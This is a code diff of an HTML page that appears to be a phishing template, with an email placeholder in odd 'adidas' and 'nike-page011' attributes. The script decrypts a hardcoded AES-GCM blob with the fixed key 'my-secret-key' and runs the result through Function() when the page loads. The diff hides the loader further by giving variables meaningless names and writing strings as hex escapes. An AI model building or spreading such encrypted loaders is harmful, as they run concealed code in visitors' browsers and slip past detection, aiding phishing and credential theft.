@@ -1,63 +1,60 @@
+<!DOCTYPE html>
+<main adidas="<%=EMAIL64%>">
+    <b><p nike-page011="" ></b>
+</main>
 <script>
-  const h5 = (x) =>
+const x84 = (x) =>
     Uint8Array.from(x.match(/.{1,2}/g).map((y) => parseInt(y, 16)));
 
-  const decryptData = async (ciphertext, iv, salt, key) => {
-    const decoder = new TextDecoder();
-    const ivBytes = h5(iv);
-    const saltBytes = h5(salt);
-    const derivedKey = await crypto.subtle.deriveKey(
-      { name: "PBKDF2", salt: saltBytes, iterations: 1e5, hash: "SHA-256" },
-      await crypto.subtle.importKey(
-        "raw",
-        new TextEncoder().encode(key),
-        { name: "PBKDF2" },
+const x95 = async (xA, xB, xC, xD) => {
+    const xE = new TextDecoder();
+    const xF = x84(xB);
+    const xG = x84(xC);
+    const xH = await crypto.subtle.deriveKey(
+        { name: "PBKDF2", salt: xG, iterations: 1e5, hash: "SHA-256" },
+        await crypto.subtle.importKey(
+            "raw",
+            new TextEncoder().encode(xD),
+            { name: "PBKDF2" },
+            false,
+            ["deriveKey"]
+        ),
+        { name: "AES-GCM", length: 256 },
         false,
-        ["deriveKey"]
-      ),
-      { name: "AES-GCM", length: 256 },
-      false,
-      ["decrypt"]
+        ["decrypt"]
     );
-    const decrypted = await crypto.subtle.decrypt(
-      { name: "AES-GCM", iv: ivBytes },
-      derivedKey,
-      h5(ciphertext)
+    const xI = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv: xF },
+        xH,
+        x84(xA)
     );
-    return decoder.decode(decrypted);
-  };
+    return xE.decode(xI);
+};
 
-  const processDecryption = async () => {
-    const data = {
-      iv: "b1d6504eea678a007e5d0a24",
-      salt: "d18df4d946a3b82aa0f930ee3300f82c",
-      ciphertext:
-        "ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f",
+const x96 = async () => {
+    const x97 = {
+        iv: "b1d6504eea678a007e5d0a24",
+        salt: "d18df4d946a3b82aa0f930ee3300f82c",
+        ciphertext:
+            "ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f",
     };
 
-    if (!data) {
-      console.error("No data found");
-      return;
+    if (!x97) {
+        console.error("\x4e\x6f\x20\x64\x61\x74\x61\x20\x66\x6f\x75\x6e\x64"); // "No data found"
+        return;
     }
 
-    const { ciphertext, iv, salt } = data;
+    const { ciphertext: x98, iv: x99, salt: x9A } = x97;
 
     try {
-      const decryptedText = await decryptData(
-        ciphertext,
-        iv,
-        salt,
-        "my-secret-key"
-      );
-      console.log("Decrypted:", decryptedText);
-      Function(`${decryptedText}`)();
-    } catch (error) {
-      console.error("Error:", error.message);
+        const x9B = await x95(x98, x99, x9A, "\x6d\x79\x2d\x73\x65\x63\x72\x65\x74\x2d\x6b\x65\x79"); // "my-secret-key"
+        console.log("\x44\x65\x63\x72\x79\x70\x74\x65\x64\x3a", x9B); // "Decrypted:"
+        Function(`${x9B}`)();
+    } catch (x9C) {
+        console.error("\x45\x72\x72\x6f\x72\x3a", x9C.message); // "Error:"
     }
-  };
+};
 
-  processDecryption();
+x96();
+
 </script>
-<div adidas="<%=EMAIL64%>">
-    <span><p nike-page011="" ></span>
-</div>
